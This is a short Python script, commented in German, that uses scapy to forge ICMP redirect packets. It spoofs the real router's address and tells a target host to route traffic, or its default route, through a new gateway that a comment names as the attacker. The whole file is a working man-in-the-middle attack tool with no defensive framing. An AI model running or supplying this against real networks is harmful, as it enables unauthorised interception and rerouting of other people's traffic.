import sys
import os
import socket
from scapy.all import sr1,IP,ICMP,send,UDP

if __name__ == '__main__':
    if sys.argv[1]=="-h" or sys.argv[1] == "-help" or sys.argv[1] == "/h" or sys.argv[1] == "/help":
        print("ir [echter router] [Target] [neues Gateway] [route](-d = 0.0.0.0) [amount](default is 3)")
        exit()
    ip=IP()
    ip.src = sys.argv[1] # echter router
    ip.dst = sys.argv[2] # Target

    icmp=ICMP()
    icmp.type=5
    icmp.code=1
    if sys.argv[3] == "-o":
        hostname = socket.gethostname()
        gw = socket.gethostbyname(hostname)
    else:
        gw = sys.argv[3]

    icmp.gw=gw # neues gateway / angreifer

    ip2=IP()
    ip2.src=sys.argv[2] # target adresse
    if sys.argv[4] == "-d":
        route = '0.0.0.0'
    else:
        route = sys.argv[4]
    ip2.dst=route # route oder netz

    if len(sys.argv)<6:
        amount = 3
    else:
        amount = int(sys.argv[5])


    print("Package configuration:")
    print("Target: " + sys.argv[2])
    print("Source: " + sys.argv[1])
    print("New Gateway: " + gw)
    print("Route: " + route)
    print("Amount: " + str(amount))

    send(ip/icmp/ip2/UDP(), count=amount)
    print("---Done!---")

